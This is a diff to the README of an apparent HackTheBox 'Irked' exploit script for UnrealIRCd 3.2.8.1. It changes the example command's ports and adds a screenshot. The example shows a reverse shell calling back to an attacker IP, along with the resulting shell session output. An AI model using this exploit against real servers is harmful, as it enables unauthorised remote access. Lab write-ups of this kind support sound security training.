@@ -9,7 +9,7 @@ Developed this script for [Irked from HackTheBox](https://www.hackthebox.eu/home
 Call the python script with four arguments to identify the target ip and port, and the callback ip and port you want to use. Then, wait and get a shell:
 
 ```
-root@kali# ./unreal_3.2.8.1_exploit.py 10.10.10.117 6697 10.10.14.14 443
+root@kali# ./unreal_3.2.8.1_exploit.py 10.10.10.117 8067 10.10.14.14 4444
 [*] Connecting to 10.10.10.117:6697
 [*] Sending payload
 [+] Payload sent. Closing socket.
@@ -20,6 +20,9 @@ ircd@irked:~/Unreal3.2$ id
 id
 uid=1001(ircd) gid=1001(ircd) groups=1001(ircd)
 ```
+
+![image](https://github.com/h4md153v63n/Python_Scripts/assets/5091265/e9aca050-8c04-4fc1-afff-dd6daaaf6ca5)
+
 
 ## References:
 - https://0xdf.gitlab.io/2019/04/27/htb-irked.html#script-it
